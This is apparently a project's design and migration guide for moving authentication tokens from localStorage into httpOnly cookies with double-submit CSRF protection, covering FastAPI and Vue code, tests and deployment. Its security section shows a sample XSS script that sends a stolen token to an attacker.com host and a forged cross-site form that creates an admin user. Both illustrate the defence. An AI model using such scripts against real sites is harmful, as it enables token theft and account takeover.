# Phase 2: Cookie-based Authentication + CSRF Protection

This document explains the cookie-based authentication system implemented in Phase 2 to replace localStorage JWT storage and add CSRF protection.

## Overview

**Security Problem:** Storing JWTs in localStorage is vulnerable to XSS attacks. Any JavaScript code can read localStorage and steal authentication tokens.

**Solution:** Use httpOnly cookies for authentication tokens, which are:
- **Not accessible to JavaScript** (XSS protection)
- **Automatically sent with requests** (no manual token management)
- **Scoped to specific paths** (admin vs portal)
- **Protected with CSRF tokens** (prevents cross-site attacks)

## Architecture

### Cookie Types

1. **Admin Token Cookie**
   - Name: `admin_token`
   - httpOnly: `true` (JavaScript cannot read)
   - Secure: `true` (HTTPS only in production)
   - SameSite: `lax` (allows SSO redirects)
   - Path: `/api/admin` (only sent to admin endpoints)
   - Max-Age: `28800` seconds (8 hours)

2. **Portal Token Cookie**
   - Name: `portal_token`
   - httpOnly: `true`
   - Secure: `true`
   - SameSite: `strict` (prevent CSRF)
   - Path: `/api` (sent to all API endpoints)
   - Max-Age: `2592000` seconds (30 days)

3. **CSRF Token Cookie**
   - Name: `csrf_token`
   - httpOnly: `false` (JavaScript CAN read - by design)
   - Secure: `true`
   - SameSite: `strict`
   - Path: `/` (available to all pages)
   - Max-Age: Matches auth token expiry

### CSRF Protection

**Double-Submit Cookie Pattern:**
1. Server generates CSRF token on login
2. Token sent in two places:
   - Cookie (readable by JavaScript)
   - Response body (for initial setup)
3. Client reads cookie and includes in `X-CSRF-Token` header
4. Server validates header matches cookie

**Token Format:**
```
{timestamp}.{user_id}.{hmac_signature}
```

Example:
```
1691234567.admin.a3f2e1d9c8b7a6e5d4c3b2a1...
```

**Validation:**
- Signature verified using HMAC-SHA256
- Timestamp checked (not expired, not future)
- User ID matches authenticated session
- Constant-time comparison prevents timing attacks

## Migration Strategy

### Week 1-2: Dual Mode Support

Both authentication methods work:
- **Cookie-based** (new): Tokens in httpOnly cookies
- **Header-based** (legacy): Tokens in Authorization header

Backend checks cookies first, falls back to headers:

```python
def get_admin_token(request: Request):
    # Try cookie first (new method)
    token = request.cookies.get("admin_token")
    if token:
        return token

    # Fall back to Authorization header (legacy)
    auth_header = request.headers.get("Authorization")
    if auth_header and auth_header.startswith("Bearer "):
        return auth_header[7:]

    return None
```

### Week 3: Cookie Enforcement

After monitoring shows adoption:
1. Remove Authorization header fallback
2. Enforce cookie-only authentication
3. Return 401 if no cookie present

## Backend Implementation

### Files Created

```
backend/app/csrf.py              - CSRF token generation and validation
backend/app/cookie_auth.py       - Cookie helpers (set/clear/get)
```

### Files Modified

```
backend/app/config.py            - Cookie configuration settings
backend/app/main.py              - Admin login/logout with cookies
backend/app/routers/user_auth.py - User login/logout with cookies
```

### Cookie Configuration

In `backend/app/config.py`:
```python
# Cookie-based authentication (Phase 2)
cookie_secure: bool = True           # Set to False for local development
cookie_domain: Optional[str] = None  # e.g., .yourdomain.com
enforce_csrf: bool = True            # Set to False during testing
```

Environment variables:
```bash
COOKIE_SECURE=true               # Require HTTPS
COOKIE_DOMAIN=.beprepared.dev    # Share cookies across subdomains
ENFORCE_CSRF=true                # Enforce CSRF validation
```

### CSRF Validation

Add to protected endpoints:

```python
from fastapi import Depends
from app.csrf import require_csrf

@router.post("/api/admin/users")
async def create_user(
    data: dict,
    _: None = Depends(require_csrf)  # CSRF validation
):
    # Create user logic
    pass
```

**When to use:**
- All POST/PUT/DELETE endpoints
- Skip for GET/HEAD/OPTIONS (safe methods)
- Skip for public endpoints (no authentication)

### Setting Cookies on Login

**Admin Login:**
```python
from app.cookie_auth import set_admin_auth_cookies

@app.post("/api/auth/login")
async def admin_login(response: Response, body: dict):
    # ... verify credentials ...

    # Set cookies (token + CSRF)
    set_admin_auth_cookies(response, token, admin_email)

    return {"access_token": token}  # Backward compatibility
```

**User Login:**
```python
from app.cookie_auth import set_portal_auth_cookies

@router.post("/login")
async def user_login(response: Response, body: dict):
    # ... verify credentials ...

    # Set cookies (token + CSRF)
    set_portal_auth_cookies(response, token, user_id)

    return {"token": token, "profile_id": user_id}
```

### Clearing Cookies on Logout

**Admin Logout:**
```python
from app.cookie_auth import clear_admin_cookies

@app.post("/api/auth/logout")
async def admin_logout(response: Response):
    clear_admin_cookies(response)
    return {"status": "logged_out"}
```

**User Logout:**
```python
from app.cookie_auth import clear_portal_cookies

@router.post("/logout")
async def user_logout(response: Response):
    clear_portal_cookies(response)
    return {"status": "logged_out"}
```

## Frontend Implementation

### Files Created

```
frontend/src/utils/csrf.js  - CSRF token utilities
frontend/src/utils/api.js   - API client with CSRF support
```

### Using the API Client

**Simple API Calls:**
```javascript
import { api } from '@/utils/api.js';

// GET request (no CSRF needed)
const users = await api.get('/api/admin/users');

// POST request (CSRF auto-added)
const newUser = await api.post('/api/admin/users', {
  email: 'user@example.com',
  name: 'John Doe'
});

// PUT request
const updated = await api.put('/api/admin/users/123', {
  name: 'Jane Doe'
});

// DELETE request
await api.delete('/api/admin/users/123');
```

**Using Specialized Endpoints:**
```javascript
import { adminAPI, portalAPI } from '@/utils/api.js';

// Admin login
try {
  await adminAPI.login('admin@hermes.io', 'password123');
  // Cookies automatically set, redirect to dashboard
  window.location.href = '/admin/dashboard';
} catch (error) {
  console.error('Login failed:', error.message);
}

// User login
try {
  const result = await portalAPI.login('user@example.com', 'password123');
  console.log('Logged in as:', result.profile_id);
  window.location.href = '/user/dashboard';
} catch (error) {
  console.error('Login failed:', error.message);
}

// Logout
await adminAPI.logout(); // Redirects to /login
await portalAPI.logout(); // Redirects to /user/login
```

### Manual CSRF Handling

If not using the API client:

```javascript
import { getCSRFToken, authenticatedFetch } from '@/utils/csrf.js';

// Add CSRF to custom fetch
const response = await fetch('/api/admin/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': getCSRFToken()
  },
  credentials: 'include', // IMPORTANT: Include cookies
  body: JSON.stringify({ name: 'New User' })
});

// Or use authenticatedFetch helper
const response = await authenticatedFetch('/api/admin/users', {
  method: 'POST',
  body: { name: 'New User' }
});
```

### Checking Authentication

```javascript
import { isAuthenticated, isAdminAuthenticated, isPortalAuthenticated } from '@/utils/csrf.js';

// Check if any user is logged in
if (isAuthenticated()) {
  console.log('User is logged in');
}

// Check specific auth type
if (isAdminAuthenticated()) {
  console.log('Admin is logged in');
}

if (isPortalAuthenticated()) {
  console.log('Portal user is logged in');
}
```

### Router Guards

Update Vue Router guards to check cookies:

```javascript
import { isAdminAuthenticated } from '@/utils/csrf.js';

router.beforeEach((to, from, next) => {
  if (to.meta.requiresAdmin && !isAdminAuthenticated()) {
    next('/login');
  } else {
    next();
  }
});
```

### Migration from localStorage

**Old Code:**
```javascript
// ❌ Old way - localStorage
localStorage.setItem('token', token);
const token = localStorage.getItem('token');

fetch('/api/users', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

**New Code:**
```javascript
// ✅ New way - cookies
import { api } from '@/utils/api.js';

// Login sets cookies automatically
await adminAPI.login(email, password);

// No need to manually manage tokens
await api.get('/api/users');
```

## Testing

### Manual Testing

**1. Test Login Sets Cookies**

```bash
# Login and capture cookies
curl -c cookies.txt -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@hermes.io","password":"your_password"}'

# Check cookies file
cat cookies.txt
# Should show: admin_token, csrf_token
```

**2. Test Authenticated Request**

```bash
# Use cookies for authenticated request
curl -b cookies.txt http://localhost:8000/api/admin/users

# Should return user list (not 401)
```

**3. Test CSRF Protection**

```bash
# Request without CSRF header (should fail)
curl -b cookies.txt -X POST http://localhost:8000/api/admin/users \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User"}'

# Response: 403 Forbidden - CSRF token required

# Request with CSRF header (should succeed)
CSRF_TOKEN=$(grep csrf_token cookies.txt | awk '{print $7}')
curl -b cookies.txt -X POST http://localhost:8000/api/admin/users \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: $CSRF_TOKEN" \
  -d '{"name":"Test User"}'

# Response: 200 OK - User created
```

**4. Test Logout Clears Cookies**

```bash
# Logout
curl -b cookies.txt -c cookies.txt -X POST http://localhost:8000/api/auth/logout

# Check cookies are cleared
cat cookies.txt
# admin_token and csrf_token should have Max-Age=0
```

### Browser DevTools Testing

**1. Check Cookies After Login**
- Login to admin panel
- Open DevTools → Application → Cookies
- Verify cookies present:
  - `admin_token` (httpOnly: ✓)
  - `csrf_token` (httpOnly: ✗)

**2. Verify JavaScript Cannot Access Auth Token**
- Open DevTools → Console
- Run: `document.cookie`
- Should see `csrf_token` but NOT `admin_token`

**3. Test CSRF Protection**
- Open Network tab
- Make a POST request to create user
- Check request headers show `X-CSRF-Token`
- Check response is 200 OK

**4. Test Session Persistence**
- Login
- Close browser completely
- Reopen browser
- Navigate to admin dashboard
- Should still be logged in (cookies persisted)

### Automated Testing

Create test suite:

```javascript
// tests/auth.test.js
describe('Cookie-based Authentication', () => {
  it('should set cookies on login', async () => {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ email: 'admin@hermes.io', password: 'test' })
    });

    expect(response.headers.get('set-cookie')).toContain('admin_token');
    expect(response.headers.get('set-cookie')).toContain('csrf_token');
  });

  it('should reject requests without CSRF token', async () => {
    const response = await fetch('/api/admin/users', {
      method: 'POST',
      credentials: 'include',
      body: JSON.stringify({ name: 'Test' })
    });

    expect(response.status).toBe(403);
  });

  it('should accept requests with valid CSRF token', async () => {
    // ... test with CSRF token
  });

  it('should clear cookies on logout', async () => {
    // ... test logout
  });
});
```

## Security Considerations

### XSS Protection

**Before (localStorage):**
```javascript
// Any XSS attack can steal token
<script>
  const token = localStorage.getItem('token');
  fetch('https://attacker.com/steal?token=' + token);
</script>
```

**After (httpOnly cookies):**
```javascript
// XSS cannot access httpOnly cookies
<script>
  const token = document.cookie; // Only sees csrf_token
  // admin_token is httpOnly - not accessible!
</script>
```

### CSRF Protection

**Double-Submit Cookie Pattern:**
1. Attacker cannot read cookies (SameSite + CORS)
2. Attacker cannot forge valid CSRF token
3. Server validates cookie matches header
4. Even if attacker tricks user into clicking malicious link, CSRF token missing

**Attack Scenario:**
```html
<!-- Attacker's malicious site -->
<form action="https://hermes.app/api/admin/users" method="POST">
  <input name="email" value="attacker@evil.com">
  <input name="role" value="admin">
  <button>Click here for free prize!</button>
</form>
```

**Protection:**
- Form submission includes cookies (user is authenticated)
- But CSRF token NOT included (attacker can't read cookies)
- Server rejects request: "CSRF token required"
- Attack fails ✅

### Cookie Security Flags

**httpOnly:**
- Prevents JavaScript access
- Protects against XSS token theft

**Secure:**
- HTTPS only
- Prevents man-in-the-middle attacks

**SameSite=strict:**
- Cookie not sent on cross-site requests
- Prevents CSRF attacks

**SameSite=lax:**
- Cookie sent on top-level navigation
- Allows SSO redirects (admin only)

### Token Expiry

**Admin Token:** 8 hours
- Shorter expiry for sensitive operations
- Forces re-authentication daily
- Suitable for admin panel access

**Portal Token:** 30 days
- Longer expiry for user convenience
- Remember-me functionality
- Mobile-friendly

**CSRF Token:** Matches auth token
- Same expiry as auth token
- Must be refreshed on login
- Invalid after logout

## Troubleshooting

### Cookies Not Being Set

**Symptoms:**
- Login succeeds but no cookies in browser
- Still redirected to login on protected pages

**Solutions:**
1. Check `credentials: 'include'` in fetch calls
2. Verify CORS allows credentials:
   ```python
   allow_credentials=True
   ```
3. Check Secure flag matches protocol (http vs https)
4. Inspect response headers for `Set-Cookie`

### CSRF Token Errors

**Symptoms:**
- 403 errors on POST/PUT/DELETE
- "CSRF token required" or "CSRF token mismatch"

**Solutions:**
1. Verify CSRF token in cookie exists:
   ```javascript
   console.log(document.cookie);
   ```
2. Check `X-CSRF-Token` header is set:
   ```javascript
   console.log(headers['X-CSRF-Token']);
   ```
3. Ensure cookie and header match exactly
4. Check token hasn't expired
5. Try logging out and back in to get fresh token

### Cookies Not Sent with Requests

**Symptoms:**
- 401 Unauthorized despite being logged in
- Cookies visible in DevTools but not in request

**Solutions:**
1. Add `credentials: 'include'` to all fetch calls
2. Check cookie path matches request path
3. Verify cookie domain is correct
4. Check SameSite settings
5. Ensure request is same-origin or CORS configured

### Session Not Persisting

**Symptoms:**
- Logged out after closing browser
- Need to re-login every session

**Solutions:**
1. Check Max-Age is set (not just Expires)
2. Verify browser not in incognito mode
3. Check browser cookie settings allow persistence
4. Ensure cookies not being cleared by extension

## Production Deployment

### Environment Variables

```bash
# .env
COOKIE_SECURE=true                    # Require HTTPS
COOKIE_DOMAIN=.beprepared.dev         # Your domain
ENFORCE_CSRF=true                     # Enforce CSRF validation
SUPABASE_JWT_SECRET=your_secret_key   # Used for CSRF signing
```

### HTTPS Requirements

**Development:**
```bash
# Local development (HTTP)
COOKIE_SECURE=false
PUBLIC_URL=http://localhost:5173
```

**Production:**
```bash
# Production (HTTPS required)
COOKIE_SECURE=true
PUBLIC_URL=https://beprepared.dev
```

### Subdomain Cookie Sharing

To share cookies across subdomains:

```bash
# Set cookie domain
COOKIE_DOMAIN=.beprepared.dev

# Cookies will work on:
# - beprepared.dev
# - www.beprepared.dev
# - api.beprepared.dev
# - admin.beprepared.dev
```

### Monitoring

Track cookie auth adoption:

```sql
-- Check authentication methods used
SELECT
  CASE
    WHEN details->>'auth_method' = 'cookie' THEN 'Cookie'
    ELSE 'Header (Legacy)'
  END as auth_method,
  COUNT(*) as login_count
FROM audit_logs
WHERE event_type = 'admin_login'
  AND timestamp > NOW() - INTERVAL '7 days'
GROUP BY auth_method;
```

### Rollback Plan

If issues arise:

**1. Disable CSRF Enforcement:**
```bash
ENFORCE_CSRF=false
```

**2. Keep Dual Mode:**
- Don't remove Authorization header support
- Let clients use either method

**3. Full Rollback:**
- Revert code changes
- Frontend continues using localStorage
- Backend continues accepting Authorization header

## Next Steps

After Phase 2 is deployed and verified:

**Short-term (1-2 weeks):**
1. Monitor cookie auth adoption
2. Review CSRF errors in Sentry
3. Gather user feedback
4. Fix any compatibility issues

**Medium-term (1 month):**
5. Analyze security logs for CSRF attacks blocked
6. Remove Authorization header fallback
7. Enforce cookie-only authentication
8. Add CSRF to remaining endpoints

**Then proceed to Phase 3:**
- API Key Encryption with per-tenant DEKs
- See original implementation plan

## Resources

- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [FastAPI Cookie Parameters](https://fastapi.tiangolo.com/tutorial/cookie-params/)
- [Double-Submit Cookie Pattern](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#double-submit-cookie)
